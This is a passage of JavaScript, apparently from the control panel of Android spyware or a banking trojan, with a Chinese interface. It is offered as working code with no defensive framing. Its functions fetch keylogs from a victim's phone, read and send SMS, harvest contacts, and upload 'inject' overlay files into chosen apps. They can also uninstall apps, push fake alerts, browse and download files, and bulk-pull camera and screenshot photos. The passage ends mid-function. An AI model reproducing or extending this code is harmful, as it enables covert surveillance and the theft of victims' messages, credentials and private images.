        function getKeylogByDate() { const d = document.getElementById('keylogDate').value; if (!d) { toast('请选择日期', 'error'); return; } toast('正在加载...'); fetch('/api/KeylogSave.php?phone_id=' + phoneId + '&date=' + encodeURIComponent(d) + '&token=' + encodeURIComponent(apiToken)).then(r => r.json()).then(res => { if (res.status === 'success') { const data = res.data || ''; const count = res.count || 0; if (!data) { toast('该日期无记录', 'error'); return; } document.body.insertAdjacentHTML('beforeend', `<div class="modal-overlay" id="keylogDateModal" onclick="if(event.target===this)this.remove()"><div class="modal-box" style="width:700px;max-width:90%;max-height:80vh;display:flex;flex-direction:column;"><div class="modal-header"><span><i class="fas fa-calendar-day"></i> ${d} 键盘记录 (${count}条)</span><button class="modal-close" onclick="document.getElementById('keylogDateModal').remove()">&times;</button></div><div class="modal-body" style="flex:1;overflow-y:auto;padding:0;"><pre style="white-space:pre-wrap;word-break:break-all;margin:0;padding:12px;font-size:12px;color:var(--text);background:var(--bg);min-height:300px;">${esc(data)}</pre></div><div class="modal-footer" style="padding:10px;border-top:1px solid var(--border);text-align:right;"><button class="btn btn-secondary" onclick="document.getElementById('keylogDateModal').remove()">关闭</button></div></div></div>`); toast('加载完成'); } else { toast('加载失败', 'error'); } }).catch(e => toast('加载失败', 'error')); }
        function loadServerKeylogDates() { if (!phoneId) return; fetch('/api/KeylogSave.php?phone_id=' + phoneId + '&action=dates&token=' + encodeURIComponent(apiToken)).then(r => r.json()).then(res => { if (res.status === 'success' && res.dates && res.dates.length > 0) { const sel = document.getElementById('keylogDate'); keylogDates = res.dates; sel.innerHTML = '<option value="">选择日期...</option>' + res.dates.map(d => `<option value="${d}">${d}</option>`).join(''); } }).catch(e => { console.error('加载日期失败:', e); }); }
        let keylogFirstData = true;
        let keylogLastSave = {};  // 去重用：{内容: 最后保存时间戳}
        const KEYLOG_DEDUP_MS = 60000;  // 1分钟内相同内容不重复保存
        
        function showKeylogRealtime(data) { 
            if (!data) return; 
            const v = document.getElementById('keylogViewer'); 
            const now = new Date(); 
            const time = now.toLocaleTimeString(); 
            // 使用标准格式 YYYY/M/D
            const date = `${now.getFullYear()}/${now.getMonth()+1}/${now.getDate()}`; 
            const entry = `[${date} ${time}] ${data}`; 
            
            // 去重逻辑：1分钟内相同内容只保存一条
            const dataKey = data.trim();
            const nowTs = Date.now();
            const lastSaveTs = keylogLastSave[dataKey] || 0;
            
            if (nowTs - lastSaveTs >= KEYLOG_DEDUP_MS) {
                // 超过1分钟或首次，保存数据
                keylogAllData += (keylogAllData ? '\n' : '') + entry; 
                saveKeylogToServer(entry); 
                keylogLastSave[dataKey] = nowTs;
                
                // 清理旧的去重记录（超过2分钟的）
                const cleanThreshold = nowTs - 120000;
                for (const k in keylogLastSave) {
                    if (keylogLastSave[k] < cleanThreshold) delete keylogLastSave[k];
                }
            }
            
            // 界面始终显示最新数据（但去重后才会保存到服务器）
            if (keylogFirstData) { v.innerHTML = ''; keylogFirstData = false; } 
            v.innerHTML += `<div class="log-entry"><div class="log-time">${time}</div><div class="log-content">${esc(data)}</div></div>`; 
            v.scrollTop = v.scrollHeight; 
        }
        function showKeylogHistory(data) { const v = document.getElementById('keylogViewer'); if (!data) { v.innerHTML = '<div class="status-msg"><i class="fas fa-keyboard"></i><span>暂无数据</span></div>'; return; } try { const decoded = decodeURIComponent(data); keylogAllData = decoded; const lines = decoded.split('>').filter(l => l.trim()); v.innerHTML = lines.map(l => { const p = l.split('|'); return `<div class="log-entry"><div class="log-time">[${p[3]||''}] ${p[0]||''}</div><div class="log-content">${esc(p[2]||p[1]||l)}</div></div>`; }).join(''); } catch (e) { keylogAllData = data; v.innerHTML = `<div class="log-entry"><div class="log-content">${esc(data)}</div></div>`; } }

        let smsTimeout = null;
        function getSMS() { 
            document.getElementById('smsViewer').innerHTML = '<div class="loading"><div class="progress-bar"><div class="progress-bar-inner"></div></div><span>正在获取短信...</span></div>'; 
            send('slr_panelsend', 'SMS');
            if (smsTimeout) clearTimeout(smsTimeout);
            smsTimeout = setTimeout(() => {
                const v = document.getElementById('smsViewer');
                if (v.querySelector('.progress-bar')) {
                    v.innerHTML = '<div class="loading"><span>暂无数据</span></div>';
                }
            }, 30000);
        }
        function sendSMS() { const num = document.getElementById('smsNumber').value; const msg = document.getElementById('smsContent').value; if (num && msg) { send('slr_panelsend', 'SMSSEND', { smsnumber: num, message: msg }); toast('发送短信...'); } }
        function showSMS(data) { if (smsTimeout) clearTimeout(smsTimeout); const v = document.getElementById('smsViewer'); if (!data) { v.innerHTML = '<div class="loading"><span>暂无数据</span></div>'; return; } smsCache = []; data.split('\n').forEach(line => { try { const j = JSON.parse(line.trim()); if (j) smsCache.push(j); } catch {} }); v.innerHTML = smsCache.length ? smsCache.map((s, i) => `<div class="list-item" style="cursor:pointer;" data-sms="${i}"><div class="item-avatar"><i class="fas fa-sms"></i></div><div class="item-info"><div class="item-name">${esc(s.address||s.number||'未知')}</div><div class="item-sub">${esc(s.time||'')} - ${esc((s.message||s.full_message||'').substring(0, 50))}${(s.message||s.full_message||'').length > 50 ? '...' : ''}</div></div><div class="item-actions"><button class="btn btn-sm btn-secondary">详情</button></div></div>`).join('') : '<div class="loading"><span>暂无数据</span></div>'; v.onclick = function(e) { const item = e.target.closest('[data-sms]'); if (!item) return; const s = smsCache[parseInt(item.dataset.sms)]; if (s) showDetailDialog('短信详情', `号码：${s.address||s.number||'未知'}\n时间：${s.time||'未知'}\n\n内容：\n${s.full_message||s.message||'无'}`); }; }

        let contactsTimeout = null;
        function getContacts() { 
            document.getElementById('contactsViewer').innerHTML = '<div class="loading"><div class="progress-bar"><div class="progress-bar-inner"></div></div><span>正在获取联系人...</span></div>'; 
            send('slr_panelsend', 'Contacts');
            if (contactsTimeout) clearTimeout(contactsTimeout);
            contactsTimeout = setTimeout(() => {
                const v = document.getElementById('contactsViewer');
                if (v.querySelector('.progress-bar')) {
                    v.innerHTML = '<div class="loading"><span>暂无数据</span></div>';
                }
            }, 30000);
        }
        function showContacts(data) { if (contactsTimeout) clearTimeout(contactsTimeout); const v = document.getElementById('contactsViewer'); if (!data) { v.innerHTML = '<div class="loading"><span>暂无数据</span></div>'; return; } contactsCache = []; data.split('\n').forEach(line => { try { const j = JSON.parse(line.trim()); if (j) contactsCache.push(j); } catch {} }); const unique = {}; contactsCache.forEach(c => { const k = (c.name||'')+(c.number||''); if (!unique[k]) unique[k] = c; }); contactsCache = Object.values(unique); v.innerHTML = contactsCache.length ? contactsCache.map((c, i) => `<div class="list-item" style="cursor:pointer;" data-contact="${i}"><div class="item-avatar">${(c.name||'?').charAt(0).toUpperCase()}</div><div class="item-info"><div class="item-name">${esc(c.name||'未知')}</div><div class="item-sub">${esc(c.number||'')}</div></div><div class="item-actions"><button class="btn btn-sm btn-secondary">详情</button></div></div>`).join('') : '<div class="loading"><span>暂无数据</span></div>'; v.onclick = function(e) { const item = e.target.closest('[data-contact]'); if (!item) return; const c = contactsCache[parseInt(item.dataset.contact)]; if (c) showDetailDialog('联系人详情', `姓名：${c.name||'未知'}\n号码：${c.number||'未知'}\n来源：${c.connected_via||'未知'}`); }; }
        function showDetailDialog(title, content) { document.getElementById('detailTitle').textContent = title; document.getElementById('detailContent').textContent = content; document.getElementById('detailDialog').style.display = 'flex'; }
        function closeDetailDialog() { document.getElementById('detailDialog').style.display = 'none'; }

        let appsTimeout = null;
        function getApps() { 
            document.getElementById('appsViewer').innerHTML = '<div class="loading"><div class="progress-bar"><div class="progress-bar-inner"></div></div><span>正在获取应用列表...</span></div>'; 
            send('slr_panelsend', 'LOADAPPS');
            if (appsTimeout) clearTimeout(appsTimeout);
            appsTimeout = setTimeout(() => {
                const v = document.getElementById('appsViewer');
                if (v.querySelector('.progress-bar')) {
                    v.innerHTML = '<div class="loading"><span>暂无数据</span></div>';
                }
            }, 30000);
        }
        function showApps(data) { if (appsTimeout) clearTimeout(appsTimeout); const v = document.getElementById('appsViewer'); if (!data) { v.innerHTML = '<div class="loading"><span>暂无数据</span></div>'; return; } try { const apps = JSON.parse(data).apps || []; appsCache = apps; renderApps(apps, v); } catch (e) { v.innerHTML = '<div class="loading"><span>解析失败</span></div>'; } }
        function searchApps() { const keyword = (document.getElementById('appSearch').value || '').toLowerCase().trim(); const v = document.getElementById('appsViewer'); if (!appsCache || !appsCache.length) return; if (!keyword) { renderApps(appsCache, v); return; } const filtered = appsCache.filter(a => (a.name && a.name.toLowerCase().includes(keyword)) || (a.packageName && a.packageName.toLowerCase().includes(keyword))); renderApps(filtered.length ? filtered : [], v, true); if (!filtered.length) { v.innerHTML = '<div class="loading"><span>未找到匹配的应用</span></div>'; } }
        function renderApps(apps, v, isFiltered = false) { if (!apps.length) { v.innerHTML = '<div class="loading"><span>暂无数据</span></div>'; return; } v.innerHTML = ''; const fragment = document.createDocumentFragment(); apps.forEach((a) => { const pkg = a.packageName || ''; const div = document.createElement('div'); div.className = 'list-item'; div.innerHTML = `<div class="item-avatar">${a.icon ? `<img src="data:image/png;base64,${a.icon}" loading="lazy">` : '<i class="fas fa-cube"></i>'}</div><div class="item-info"><div class="item-name">${esc(a.name||'未知')}</div><div class="item-sub">${esc(pkg)}</div></div><div class="item-actions"><button class="btn btn-sm btn-secondary" data-action="open" data-pkg="${esc(pkg)}">打开</button><button class="btn btn-sm btn-success" data-action="inject" data-pkg="${esc(pkg)}">注入</button><button class="btn btn-sm btn-danger" data-action="uninstall" data-pkg="${esc(pkg)}">卸载</button><button class="btn btn-sm btn-warning" data-action="alert" data-pkg="${esc(pkg)}" data-name="${esc(a.name||'')}" data-icon="${a.icon ? '1' : ''}">弹窗</button></div>`; div.dataset.pkg = pkg; div.dataset.icon = a.icon || ''; fragment.appendChild(div); }); v.appendChild(fragment); v.onclick = function(e) { const btn = e.target.closest('button[data-action]'); if (!btn) return; const pkg = btn.dataset.pkg; const app = appsCache.find(a => a.packageName === pkg); if (!app && !pkg) return; switch(btn.dataset.action) { case 'open': openApp(pkg); break; case 'inject': injectApp(pkg); break; case 'uninstall': uninstallApp(pkg); break; case 'alert': showAlertDialog(pkg, btn.dataset.name || '', app && app.icon ? 'data:image/png;base64,'+app.icon : ''); break; } }; }
        function openApp(pkg) { if (pkg) { send('slr_panelsend', 'OPENAPP', { packageName: pkg }); toast('打开应用...'); } }
        function uninstallApp(pkg) { if (pkg) { send('slr_panelsend', 'UNINSTALLAPP', { packageName: pkg }); toast('卸载应用...'); } }

        function getInjectLogs() { document.getElementById('injectViewer').innerHTML = '<div class="loading"><div class="progress-bar"><div class="progress-bar-inner"></div></div><span>正在获取注入记录...</span></div>'; send('slr_panelsend', 'OPENINJ'); }
        function showInjectLogs(data) { const v = document.getElementById('injectViewer'); if (!data) { v.innerHTML = '<div class="loading"><span>暂无数据</span></div>'; return; } try { const logs = data.split(/\r?\n/).filter(l => l.trim()).map(l => { const parts = l.split('||'); const html = (parts.find(p => p.startsWith('[HTML]')) || '').replace('[HTML]', ''); const pkg = (parts.find(p => p.startsWith('[PKG]')) || '').replace('[PKG]', ''); const log = (parts.find(p => p.startsWith('[LOG]')) || '').replace('[LOG]', ''); return { html, pkg, log }; }); v.innerHTML = logs.length ? logs.map(l => `<div class="list-item" style="border-left:3px solid var(--success);"><div class="item-info" style="flex:1;"><div class="item-name" style="color:var(--accent);">${esc(l.html || '未知')}</div><div class="item-sub" style="color:var(--success);">${esc(l.pkg || '')}</div><div class="item-sub" style="color:var(--danger);margin-top:4px;">${esc(l.log || '')}</div></div></div>`).join('') : '<div class="loading"><span>暂无注入记录</span></div>'; } catch (e) { v.innerHTML = '<div class="loading"><span>解析失败</span></div>'; } }

        let injectTargetPkg = '';
        function injectApp(pkg) { injectTargetPkg = pkg; document.getElementById('injectFileInput').click(); }
        function handleInjectFile(e) { const file = e.target.files[0]; if (!file) { toast('请选择文件', 'error'); return; } if (!injectTargetPkg) { toast('未选择应用', 'error'); return; } const reader = new FileReader(); reader.onload = () => { const base64 = reader.result.split(',')[1] || reader.result; const msg = { pid: phoneId, itype: 'slr_panelsend', subc: 'changefiles', comdtype: 'U', isinjct: '1', jctid: injectTargetPkg, filename: file.name, size: file.size, content: base64, filepath: '' }; if (ws?.readyState === WebSocket.OPEN) { ws.send(JSON.stringify(msg)); toast('注入文件已发送: ' + file.name); } else { toast('未连接', 'error'); } }; reader.onerror = () => toast('读取文件失败', 'error'); reader.readAsDataURL(file); e.target.value = ''; }
        let alertAppPkg = '', alertAppIcon = '';
        function showAlertDialog(pkg, name, icon) { alertAppPkg = pkg; alertAppIcon = icon; document.getElementById('alertTitle').value = ''; document.getElementById('alertMsg').value = ''; document.getElementById('alertDialog').style.display = 'flex'; }
        function closeAlertDialog() { document.getElementById('alertDialog').style.display = 'none'; }
        function sendAlert() { const title = document.getElementById('alertTitle').value; const msg = document.getElementById('alertMsg').value; if (!title || !msg) { toast('请输入标题和内容', 'error'); return; } if (ws?.readyState === WebSocket.OPEN) { ws.send(JSON.stringify({ pid: phoneId, itype: 'slr_panel', subc: 'bc', comand: 'alert', title: title, msg: msg, todo: alertAppPkg || '', act: alertAppPkg ? 'openApp' : 'nothing', alertico: alertAppIcon || '' })); toast('弹窗已发送'); closeAlertDialog(); } else { toast('未连接', 'error'); } }

        function getFiles(p) { document.getElementById('filesViewer').innerHTML = '<div class="loading"><div class="progress-bar"><div class="progress-bar-inner"></div></div><span>正在获取文件...</span></div>'; send('slr_panelsend', 'files', { filepath: p }); }
        function getFilesByPath() { const p = document.getElementById('pathInput').value || '/sdcard/'; document.getElementById('filesViewer').innerHTML = '<div class="loading"><div class="progress-bar"><div class="progress-bar-inner"></div></div><span>正在获取文件...</span></div>'; send('slr_panelsend', 'files', { filepath: p }); }
        function showFiles(data) { 
            const v = document.getElementById('filesViewer'); 
            if (!data) { v.innerHTML = '<div class="loading"><span>暂无文件</span></div>'; return; } 
            const files = data.split('[>D<]').map(f => { const p = f.split('[>A<]'); return { name: p[2]||'', size: p[3]||'', path: p[4]||'', date: p[5]||'' }; }).filter(f => f.name); 
            if (files.length && files[0].path) { document.getElementById('pathInput').value = files[0].path; } 
            const isDir = f => !f.name.includes('.'); 
            v.innerHTML = files.length ? files.map(f => `
                <div class="file-item" ondblclick="openFile('${esc(f.path)}/${esc(f.name)}',${isDir(f)})">
                    <div class="file-icon${isDir(f)?' folder':''}"><i class="fas fa-${isDir(f)?'folder':'file'}"></i></div>
                    <div class="file-info"><div class="file-name">${esc(f.name)}</div><div class="file-meta">${esc(f.size)} - ${esc(f.date)}</div></div>
                    ${isDir(f) 
                        ? `<button class="btn btn-sm btn-primary" onclick="event.stopPropagation();openFile('${esc(f.path)}/${esc(f.name)}',true)"><i class="fas fa-folder-open"></i> 打开</button>` 
                        : `<button class="btn btn-sm btn-secondary" onclick="event.stopPropagation();downloadFile('${esc(f.path)}/${esc(f.name)}')"><i class="fas fa-download"></i> 下载</button>`}
                </div>`).join('') : '<div class="loading"><span>文件夹为空</span></div>'; 
        }
        function openFile(path, isDir) { if (isDir) { document.getElementById('pathInput').value = path.endsWith('/') ? path : path + '/'; getFilesByPath(); } }
        function downloadFile(path) { pendingDownloadFile = true; send('slr_panelsend', 'changefiles', { comdtype: 'D', filepath: path, filetype: 'fi' }); toast('下载中...'); }

        // 文件下载分块处理
        const downloadChunks = new Map();
        const imgExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp'];
        
        function handleDownloadChunk(data) {
            const { filename, filedata, totalSize, sentSize, chunkNumber, filehash, filepath } = data;
            
            if (!filedata) return;
            
            if (!downloadChunks.has(filehash)) {
                downloadChunks.set(filehash, { chunks: [], totalSize, filename, filepath, received: 0 });
            }
            
            const dl = downloadChunks.get(filehash);
            dl.chunks[chunkNumber] = filedata;
            dl.received = sentSize;
            
            // 更新进度
            const progress = Math.round((sentSize / totalSize) * 100);
            const loadingEl = document.querySelector('.preview-loading div:nth-child(2)');
            if (loadingEl) {
                loadingEl.textContent = `正在加载... ${progress}%`;
            }
            
            // 检查是否完成
            if (sentSize >= totalSize) {
                const fullData = dl.chunks.join('');
                downloadChunks.delete(filehash);
                
                // 检查是否是相册预览
                if (currentPreviewIndex >= 0 && isImageFile(filename)) {
                    showGalleryPreviewImage(fullData);
                } else {
                    // 普通文件下载
                    downloadBase64File(filename, fullData);
                }
            }
        }
        
        function isImageFile(name) {
            if (!name) return false;
            const lower = name.toLowerCase();
            return imgExtensions.some(e => lower.endsWith(e));
        }
        
        function downloadBase64File(filename, base64Data) {
            try {
                const link = document.createElement('a');
                link.href = 'data:application/octet-stream;base64,' + base64Data;
                link.download = filename;
                link.click();
                toast('下载完成: ' + filename);
            } catch(e) {
                toast('下载失败', 'error');
            }
        }

        // 相册功能
        let galleryCache = [];
        let galleryMode = false;
        let currentPreviewIndex = -1;
        let thumbLoadQueue = [];
        let thumbLoadIndex = 0;
        let quickShowModal = null;
        
        // IndexedDB 缓存
        const DB_NAME = 'GalleryThumbCache';
        const DB_VERSION = 1;
        const STORE_NAME = 'thumbnails';
        
        function openThumbDB() {
            return new Promise((resolve, reject) => {
                const req = indexedDB.open(DB_NAME, DB_VERSION);
                req.onerror = () => reject(req.error);
                req.onsuccess = () => resolve(req.result);
                req.onupgradeneeded = (e) => {
                    const db = e.target.result;
                    if (!db.objectStoreNames.contains(STORE_NAME)) {
                        db.createObjectStore(STORE_NAME, { keyPath: 'path' });
                    }
                };
            });
        }
        
        async function saveThumbToCache(path, data) {
            try {
                const db = await openThumbDB();
                const tx = db.transaction(STORE_NAME, 'readwrite');
                tx.objectStore(STORE_NAME).put({ path, data, time: Date.now() });
                db.close();
            } catch(e) { console.error('Cache save error:', e); }
        }
        
        async function getThumbFromCache(path) {
            try {
                const db = await openThumbDB();
                return new Promise((resolve) => {
                    const tx = db.transaction(STORE_NAME, 'readonly');
                    const req = tx.objectStore(STORE_NAME).get(path);
                    req.onsuccess = () => { db.close(); resolve(req.result?.data || null); };
                    req.onerror = () => { db.close(); resolve(null); };
                });
            } catch(e) { return null; }
        }
        
        async function clearThumbCache() {
            try {
                const db = await openThumbDB();
                const tx = db.transaction(STORE_NAME, 'readwrite');
                tx.objectStore(STORE_NAME).clear();
                db.close();
                toast('缓存已清除');
            } catch(e) { toast('清除失败', 'error'); }
        }
        
        function getGallery(type) {
            const v = document.getElementById('galleryViewer');
            v.innerHTML = '<div class="loading"><div class="progress-bar"><div class="progress-bar-inner"></div></div><span>正在获取相册...</span></div>';
            galleryCache = [];
            galleryMode = true;
            
            let path = '';
            switch(type) {
                case 'DCIM': path = '/sdcard/DCIM/Camera/'; break;
                case 'Pictures': path = '/sdcard/Pictures/'; break;
                case 'Screenshots': path = '/sdcard/Pictures/Screenshots/'; break;
                case 'all': path = '/sdcard/DCIM/'; break;
                default: path = '/sdcard/DCIM/Camera/';
            }
            
            send('slr_panelsend', 'files', { filepath: path });
        }
        
        function showGalleryFiles(data) {
            galleryMode = false;
            const v = document.getElementById('galleryViewer');
            if (!data) { 
                v.innerHTML = '<div class="status-msg"><i class="fas fa-images"></i><span>暂无图片</span></div>'; 
                return; 
            }
            
            const files = data.split('[>D<]').map(f => {
                const p = f.split('[>A<]');
                return { name: p[2]||'', size: p[3]||'', path: p[4]||'', date: p[5]||'' };
            }).filter(f => f.name && imgExtensions.some(ext => f.name.toLowerCase().endsWith(ext)));
            
            galleryCache = files;
            
            if (!files.length) {
                v.innerHTML = '<div class="status-msg"><i class="fas fa-images"></i><span>该目录下没有图片，请尝试其他目录</span></div>';
                return;
            }
            
            v.innerHTML = files.map((f, i) => `
                <div class="gallery-item" data-idx="${i}" onclick="previewGalleryImage(${i})" title="${esc(f.name)}&#10;${esc(f.size)} - ${esc(f.date)}">
                    <div class="gallery-loading"><i class="fas fa-image" style="font-size:24px;"></i></div>
                    <div class="gallery-name">${esc(f.name)}</div>
                </div>
            `).join('');
            
            toast(`找到 ${files.length} 张图片，正在加载缩略图...`);
            
            // 自动加载缩略图
            loadGalleryThumbnails();
        }
        
        // 加载主相册界面的缩略图
        async function loadGalleryThumbnails() {
            let cachedCount = 0;
            let toLoadList = [];
            
            // 首先检查缓存并显示
            for (let i = 0; i < galleryCache.length; i++) {
                const f = galleryCache[i];
                const fullPath = (f.path.endsWith('/') ? f.path : f.path + '/') + f.name;
                const cached = await getThumbFromCache(fullPath);
                
                if (cached) {
                    cachedCount++;
                    const item = document.querySelector(`.gallery-item[data-idx="${i}"]`);
                    if (item) {
                        item.innerHTML = `<img src="${cached}"><div class="gallery-name">${esc(f.name)}</div>`;
                    }
                } else {
                    toLoadList.push({ file: f, index: i, path: fullPath });
                }
            }
            
            if (cachedCount > 0) {
                toast(`已从缓存加载 ${cachedCount} 张缩略图`);
            }
            
            // 逐个加载未缓存的（限制并发避免卡顿）
            if (toLoadList.length > 0) {
                for (let i = 0; i < toLoadList.length; i++) {
                    const item = toLoadList[i];
                    mainGalleryPendingPaths.set(item.path, item.index);
                    send('slr_panelsend', 'viewfile', { filepath: item.path });
                    
                    // 每个请求间隔 300ms
                    await new Promise(r => setTimeout(r, 300));
                }
            }
        }
        
        let mainGalleryPendingPaths = new Map(); // 主相册等待加载的路径
        
        function previewGalleryImage(index) {
            const f = galleryCache[index];
            if (!f) return;
            
            currentPreviewIndex = index;
            
            let existingPreview = document.getElementById('galleryPreview');
            if (existingPreview) existingPreview.remove();
            
            const preview = document.createElement('div');
            preview.id = 'galleryPreview';
            preview.className = 'gallery-preview';
            preview.onclick = (e) => { if (e.target === preview) closeGalleryPreview(); };
            
            // 先显示加载状态
            preview.innerHTML = `
                <button class="gallery-preview-close" onclick="closeGalleryPreview()">&times;</button>
                <div class="preview-loading">
                    <div class="spinner"></div>
                    <div>正在加载图片...</div>
                    <div style="font-size:12px;">${esc(f.name)}</div>
                </div>
            `;
            
            document.body.appendChild(preview);
            
            // 请求图片文件
            const fullPath = (f.path.endsWith('/') ? f.path : f.path + '/') + f.name;
            send('slr_panelsend', 'changefiles', { comdtype: 'D', filepath: fullPath, filetype: 'fi' });
            
            // 30秒超时
            setTimeout(() => {
                if (currentPreviewIndex === index) {
                    const loadingEl = document.querySelector('.preview-loading');
                    if (loadingEl) {
                        loadingEl.innerHTML = `<i class="fas fa-exclamation-triangle" style="font-size:32px;color:var(--warning);"></i><div>加载超时，请重试</div><button class="btn btn-primary btn-sm" onclick="previewGalleryImage(${index})" style="margin-top:12px;">重新加载</button>`;
                    }
                }
            }, 30000);
        }
        
        function showGalleryPreviewImage(imgData) {
            const preview = document.getElementById('galleryPreview');
            if (!preview || currentPreviewIndex < 0) return;
            
            const f = galleryCache[currentPreviewIndex];
            if (!f) return;
            
            // 处理可能的数据格式
            let imgSrc = '';
            if (imgData.startsWith('data:')) {
                imgSrc = imgData;
            } else if (imgData.startsWith('/9j/') || imgData.startsWith('iVBOR')) {
                // 标准 base64 图片数据
                const isJpeg = imgData.startsWith('/9j/');
                imgSrc = `data:image/${isJpeg ? 'jpeg' : 'png'};base64,${imgData}`;
            } else {
                imgSrc = `data:image/jpeg;base64,${imgData}`;
            }
            
            const idx = currentPreviewIndex;
            preview.innerHTML = `
                <button class="gallery-preview-close" onclick="closeGalleryPreview()">&times;</button>
                <img src="${imgSrc}" onclick="event.stopPropagation()" onerror="this.style.display='none';this.nextElementSibling.style.display='block';">
                <div style="display:none;color:var(--danger);text-align:center;"><i class="fas fa-exclamation-triangle" style="font-size:48px;margin-bottom:16px;display:block;"></i>图片加载失败</div>
                <div class="gallery-preview-info">${esc(f.name)} - ${esc(f.size)}</div>
                <div class="gallery-preview-actions">
                    ${idx > 0 ? `<button class="btn btn-secondary" onclick="previewGalleryImage(${idx-1})"><i class="fas fa-chevron-left"></i> 上一张</button>` : ''}
                    <button class="btn btn-primary" onclick="downloadGalleryImageData('${esc(f.name)}')"><i class="fas fa-download"></i> 保存</button>
                    ${idx < galleryCache.length - 1 ? `<button class="btn btn-secondary" onclick="previewGalleryImage(${idx+1})">下一张 <i class="fas fa-chevron-right"></i></button>` : ''}
                </div>
            `;
            
            // 同时更新缩略图
            const item = document.querySelector(`.gallery-item[data-idx="${idx}"]`);
            if (item && !item.querySelector('img')) {
                item.innerHTML = `<img src="${imgSrc}"><div class="gallery-name">${esc(f.name)}</div>`;
            }
        }
        
        function closeGalleryPreview() {
            const preview = document.getElementById('galleryPreview');
            if (preview) preview.remove();
            currentPreviewIndex = -1;
        }
        
        // 一键展示功能
        function quickShowGallery() {
            if (!galleryCache.length) {
                toast('请先获取相册', 'error');
                return;
            }
            
            // 创建弹窗
            if (quickShowModal) quickShowModal.remove();
            
            quickShowModal = document.createElement('div');
            quickShowModal.className = 'quick-gallery-modal';
            quickShowModal.innerHTML = `
                <div class="quick-gallery-header">
                    <h3><i class="fas fa-images"></i> 快速预览 (${galleryCache.length} 张)</h3>
                    <div style="display:flex;gap:10px;align-items:center;">
                        <span class="info" id="quickLoadInfo">准备加载...</span>
                        <button class="btn btn-secondary btn-sm" onclick="clearThumbCache()"><i class="fas fa-trash"></i>清缓存</button>
                        <button class="btn btn-danger btn-sm" onclick="closeQuickShow()"><i class="fas fa-times"></i>关闭</button>
                    </div>
                </div>
                <div class="quick-gallery-body">
                    <div class="quick-gallery-grid" id="quickGalleryGrid"></div>
                </div>
                <div class="quick-gallery-progress"><div class="quick-gallery-progress-bar" id="quickProgressBar" style="width:0%"></div></div>
            `;
            
            document.body.appendChild(quickShowModal);
            
            // 渲染缩略图格子
            const grid = document.getElementById('quickGalleryGrid');
            grid.innerHTML = galleryCache.map((f, i) => `
                <div class="quick-gallery-item" data-qidx="${i}" onclick="quickPreviewImage(${i}, event)" title="${esc(f.name)}">
                    <div class="thumb-loading"><i class="fas fa-image"></i></div>
                </div>
            `).join('');
            
            // 开始加载缩略图
            loadAllThumbnails();
        }
        
        function closeQuickShow() {
            if (quickShowModal) {
                quickShowModal.remove();
                quickShowModal = null;
            }
            // 停止加载，清理状态
            thumbLoadQueue = [];
            thumbLoadIndex = 0;
            quickPreviewIndex = -1;
            quickPreviewPendingPath = null;
        }
        
        async function loadAllThumbnails() {
            thumbLoadQueue = [...galleryCache];
            thumbLoadIndex = 0;
            let cachedCount = 0;
            let loadedCount = 0;
            
            // 首先检查缓存
            for (let i = 0; i < thumbLoadQueue.length; i++) {
                const f = thumbLoadQueue[i];
                const fullPath = (f.path.endsWith('/') ? f.path : f.path + '/') + f.name;
                const cached = await getThumbFromCache(fullPath);
                
                if (cached) {
                    cachedCount++;
                    const item = document.querySelector(`.quick-gallery-item[data-qidx="${i}"]`);
                    if (item) {
                        item.innerHTML = `<img src="${cached}"><div class="thumb-cached"><i class="fas fa-check"></i></div>`;
                    }
                    thumbLoadQueue[i] = null; // 标记已加载
                }
            }
            
            // 过滤掉已缓存的
            const toLoad = thumbLoadQueue.filter(f => f !== null);
            updateQuickLoadInfo(cachedCount, toLoad.length);
            
            if (!toLoad.length) {
                document.getElementById('quickProgressBar').style.width = '100%';
                return;
            }
            
            // 逐个加载未缓存的缩略图
            for (let i = 0; i < thumbLoadQueue.length; i++) {
                const f = thumbLoadQueue[i];
                if (!f) continue;
                
                const fullPath = (f.path.endsWith('/') ? f.path : f.path + '/') + f.name;
                
                // 请求缩略图（使用 viewfile 命令获取压缩图）
                requestThumb(fullPath, i);
                
                // 稍微延迟避免请求过快
                await new Promise(r => setTimeout(r, 200));
                
                loadedCount++;
                const progress = Math.round(((cachedCount + loadedCount) / galleryCache.length) * 100);
                document.getElementById('quickProgressBar').style.width = progress + '%';
                updateQuickLoadInfo(cachedCount, toLoad.length - loadedCount);
            }
        }
        
        function updateQuickLoadInfo(cached, remaining) {
            const info = document.getElementById('quickLoadInfo');
            if (info) {
                if (remaining <= 0) {
                    info.textContent = `已完成 (缓存: ${cached})`;
                } else {
                    info.textContent = `缓存: ${cached}, 加载中: ${remaining}`;
                }
            }
        }
        
        let pendingThumbRequests = new Map(); // filepath -> qidx
        
        function requestThumb(filepath, index) {
            pendingThumbRequests.set(filepath, index);
            // 使用 viewfile 命令获取图片
            send('slr_panelsend', 'viewfile', { filepath: filepath });
        }
        
        function handleThumbResponse(data) {
            // 处理缩略图响应
            const imgData = data.data || data.msg;
            if (!imgData) return;
            
            let imgSrc = '';
            if (imgData.startsWith('/9j/') || imgData.startsWith('iVBOR')) {
                const isJpeg = imgData.startsWith('/9j/');
                imgSrc = `data:image/${isJpeg ? 'jpeg' : 'png'};base64,${imgData}`;
            } else {
                imgSrc = `data:image/jpeg;base64,${imgData}`;
            }
            
            // 查找对应的格子（通过 path 匹配）
            const path = data.path || data.pth;
            let idx = -1;
            let isQuickShow = false;
            let isMainGallery = false;
            
            // 检查是否是一键展示的请求
            if (path && pendingThumbRequests.has(path)) {
                idx = pendingThumbRequests.get(path);
                pendingThumbRequests.delete(path);
                isQuickShow = true;
            }
            // 检查是否是主相册的请求
            else if (path && mainGalleryPendingPaths.has(path)) {
                idx = mainGalleryPendingPaths.get(path);
                mainGalleryPendingPaths.delete(path);
                isMainGallery = true;
            }
            // 尝试通过文件名匹配
            else if (path) {
                idx = galleryCache.findIndex(f => {
                    const fp = (f.path.endsWith('/') ? f.path : f.path + '/') + f.name;
                    return fp === path || path.endsWith(f.name);
                });
                isMainGallery = idx >= 0;
            }
            
            if (idx >= 0) {
                // 生成压缩缩略图
                compressToThumb(imgSrc, 150).then(thumbSrc => {
                    // 更新一键展示弹窗
                    if (isQuickShow || quickShowModal) {
                        const qItem = document.querySelector(`.quick-gallery-item[data-qidx="${idx}"]`);
                        if (qItem) {
                            qItem.innerHTML = `<img src="${thumbSrc}">`;
                        }
                    }
                    
                    // 更新主相册
                    const mItem = document.querySelector(`.gallery-item[data-idx="${idx}"]`);
                    if (mItem) {
                        const f = galleryCache[idx];
